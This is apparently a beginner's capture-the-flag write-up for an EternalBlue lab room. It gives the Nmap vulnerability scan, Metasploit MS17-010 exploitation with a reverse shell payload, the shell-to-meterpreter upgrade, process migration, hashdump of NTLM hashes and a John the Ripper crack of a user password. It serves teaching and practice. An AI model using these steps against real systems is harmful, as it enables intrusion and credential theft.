# CTF

**This room is not meant to be a boot2root CTF; rather, it's an educational series for complete beginners. Professionals will likely gain very little from this room beyond basic practice, as the focus here is on beginners.**

## Recon - Nmap

We start with reconnaissance. The industry standard is Nmap, and that's what I am using. `nmap [ip]` is enough for now, and the results are:

```
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
MAC Address: 02:89:D8:BF:23:C3 (Unknown)
```

There are many new ports that I haven't seen before. After some searching on Google, I noticed that many of these ports are Microsoft-related. This suggests that the machine is likely running Windows.

So, I need to find vulnerabilities on the machine. Nmap has the **N**map **S**cripting **E**ngine (NSE), which includes a variety of scripts. I'm particularly interested in the vulnerabilities section. After running `nmap --script=vuln [ip]`, I'm presented with numerous options. Some of them are:

```
| rdp-vuln-ms12-020:
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.

| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1 servers (ms17-010).
```

Here, I'm going to exploit the second one. That's why the room is called Blue, after the name of that vulnerability called <font color=blue> Eternal Blue </font>.

## Gain Access - Metasploit

We will use Metasploit for this room to become familiar with it. First, I need to update it with `msfupdate`. Then, I can start it with `msfconsole`.

I need to `search` for something related to this vulnerability, which I do with `search ms17-010`, a term I learned during the Recon phase. I'm presented with five choices, and I'm going to use the first one, called:

`0    exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption`

So I type `use 0`, and now I need to see some options, so I type `show options`.

```
   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://d
                                             ocs.metasploit.com/docs/using-met
                                             asploit/basics/using-metasploit.h
                                             tml
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to
                                             use for authentication. Only affe
                                             cts Windows Server 2008 R2, Windo
                                             ws 7, Windows Embedded Standard 7
                                              target machines.
   SMBPass                         no        (Optional) The password for the s
                                             pecified username
   SMBUser                         no        (Optional) The username to authen
                                             ticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matc
                                             hes exploit Target. Only affects
                                             Windows Server 2008 R2, Windows 7
                                             , Windows Embedded Standard 7 tar
                                             get machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploi
                                             t Target. Only affects Windows Se
                                             rver 2008 R2, Windows 7, Windows
                                             Embedded Standard 7 target machin
                                             es.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name

      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     10.10.123.130    yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

I definitely need to set RHOSTS and the payload settings. So I type:
`set RHOSTS [enemy ip]` and also
`set payload windows/x64/shell/reverse_tcp`.

I am ready, so I `exploit` it and wait for it to do its magic!

## Escalate

I background this session with CTRL+Z and I make sure it's there with `sessions -l`. Next, I need to search for how to convert a shell to a meterpreter shell in Metasploit. I find the module for this job called `post/multi/manage/shell_to_meterpreter`. I exit from my previous session with `back` and use the above module. I `show options`, and for this one, I need to `set SESSION [number of session with Windows shell]` and I exploit! Now I have a third session with meterpreter! I get into the meterpreter session and I run `shell`, and I am in the Windows machine! With `whoami`, I get `nt authority\system`, which is good news. I exit and go back to meterpreter. I need to migrate our process to this machine because we need to match the architecture of that machine. So I `ps` and search for one stable process. A good bet is:

```
 1280  692   spoolsv.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\spoolsv.exe
```

So I `migrate 1280`, and we are good to go!

## Cracking

Now I need to find the passwords of the users, and I can do that with the command `hashdump`, which gives me:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

I see that we have a non-default account named Jon, and that's what I am interested in. I take the hashed password and save it to a `.hash` file on my local machine. First, I need to find the type of hash. Going back to "John The Ripper-Identifying Hashes," I download the `hash-id.py` module and run it. I paste the hash, and I get:

```
Possible Hashs:
[+] md5($pass.$salt) - Joomla
```

So I run John The Ripper with:
`john Jon.hash --format=NT --wordlist=/opt/rockyou.txt`

And we have a result! I run:
`john --format=NT Desktop/Jon.hash --show` to see my results, and I have the password <font color=red > alqfna22 </font>

## Find Flags!

*Find the three flags planted on this machine. These are not traditional flags; rather, they represent key locations within the Windows system. Use the hints provided below to complete this room!*

The hint for the first flag says _This flag can be found at the system root._ So I go back to my meterpreter console and `cd ..` a couple of times. I `dir` and find my first flag.

For the second, we have _This flag can be found at the location where passwords are stored within Windows._ After some searching online, I find that the location for this one is `C:\Windows\System32\config`, and I find the second flag.

And for the third, we have _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._ I go back a few folders, `cd` into Users, find Jon, and dig around. I find my third flag in the Documents folder.

## Conclusion

Very interesting stuff! I got to know more about Nmap, John The Ripper, privilege escalation, and Windows in general. The flags required some patience to find, but all in all, it's a very good machine.
